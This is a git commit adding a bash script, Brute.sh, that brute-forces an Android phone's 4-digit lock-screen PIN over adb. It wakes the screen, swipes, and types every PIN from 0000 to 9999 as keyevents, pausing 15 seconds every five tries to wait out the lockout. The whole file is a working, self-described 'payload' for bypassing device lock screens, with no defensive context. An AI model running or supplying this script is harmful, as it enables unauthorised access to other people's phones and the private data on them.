971bbdef1241605233c462a7ea23541585580be9
AkhileshPokale-IND <81848820+AkhileshPokale-IND@users.noreply.github.com>
2021-04-24 10:50:43 +0530

    Add files via upload

---
+++ Brute.sh
@@ -0,0 +1,33 @@
+#!/usr/bin/env bash
+
+echo ----------------------------
+echo PAYLOAD STARTED 
+echo CREATED BY AKHILESH POKALE
+echo ----------------------------
+
+adb shell input keyevent 82
+adb shell input swipe 407 1211 378 85
+
+echo -------------
+echo CHECKING PIN
+echo -------------
+
+for i in {0000..9999}; do
+
+    echo -----------
+    echo TRYING $i
+    echo -----------
+	
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+
+    adb shell input keyevent 66
+    
+    if ! (( `expr $i + 1` % 5 )); then
+        adb shell input keyevent 66
+        sleep 15
+        adb shell input keyevent 82
+        adb shell input swipe 407 1211 378 85
+    fi
+done
